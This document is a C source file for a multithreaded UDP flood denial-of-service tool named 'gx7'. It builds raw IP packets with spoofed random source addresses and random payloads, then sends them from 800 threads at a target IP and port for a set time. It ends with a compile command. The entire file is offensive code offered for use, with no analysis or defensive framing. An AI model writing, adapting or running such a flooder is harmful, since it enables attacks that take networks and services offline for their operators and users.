#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>

#define PAYLOAD_SIZE 2048
#define THREADS 800
#define MAX_RANDOM_IP 450

// IP header structure
struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_flag:3, iph_offset:13;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    struct  in_addr    iph_sourceip;
    struct  in_addr    iph_destip;
};

// UDP header structure
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};

// Pseudo header for checksum calculation
struct pseudo_udp {
    unsigned int src;
    unsigned int dst;
    unsigned char zero;
    unsigned char protocol;
    unsigned short udp_length;
};

unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    for (; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

char *random_payload() {
    char *payload = malloc(PAYLOAD_SIZE);
    for (int i = 0; i < PAYLOAD_SIZE; i++) {
        payload[i] = 33 + rand() % 94; // Printable ASCII
    }
    return payload;
}

char *random_ip() {
    static char ip[16];
    snprintf(ip, sizeof(ip), "%d.%d.%d.%d",
             rand() % MAX_RANDOM_IP,
             rand() % MAX_RANDOM_IP,
             rand() % MAX_RANDOM_IP,
             rand() % MAX_RANDOM_IP);
    return ip;
}

void *flood(void *arg) {
    char *target_ip = ((char **)arg)[0];
    int target_port = atoi(((char **)arg)[1]);
    int duration = atoi(((char **)arg)[2]);
    time_t start = time(NULL);

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    int one = 1;
    const int *val = &one;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    while (time(NULL) - start < duration) {
        char *datagram = malloc(4096);
        memset(datagram, 0, 4096);

        struct ipheader *iph = (struct ipheader *)datagram;
        struct udpheader *udph = (struct udpheader *)(datagram + sizeof(struct ipheader));
        char *data = datagram + sizeof(struct ipheader) + sizeof(struct udpheader);

        strcpy(data, random_payload());

        char *source_ip = random_ip();

        iph->iph_ver = 4;
        iph->iph_ihl = 5;
        iph->iph_tos = 0;
        iph->iph_len = htons(sizeof(struct ipheader) + sizeof(struct udpheader) + PAYLOAD_SIZE);
        iph->iph_ident = htons(rand());
        iph->iph_offset = 0;
        iph->iph_ttl = rand() % 64 + 64;
        iph->iph_protocol = IPPROTO_UDP;
        iph->iph_sourceip.s_addr = inet_addr(source_ip);
        iph->iph_destip.s_addr = sin.sin_addr.s_addr;
        iph->iph_chksum = checksum((unsigned short *)datagram, iph->iph_len);

        udph->udph_srcport = htons(rand() % 65535);
        udph->udph_destport = htons(target_port);
        udph->udph_len = htons(sizeof(struct udpheader) + PAYLOAD_SIZE);
        udph->udph_chksum = 0; // Optional

        sendto(s, datagram, ntohs(iph->iph_len), 0, (struct sockaddr *)&sin, sizeof(sin));
        free(datagram);
    }

    close(s);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));

    pthread_t threads[THREADS];
    for (int i = 0; i < THREADS; i++) {
        pthread_create(&threads[i], NULL, flood, argv);
    }
    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}

//      gcc gx7.c -o gx7 -pthread
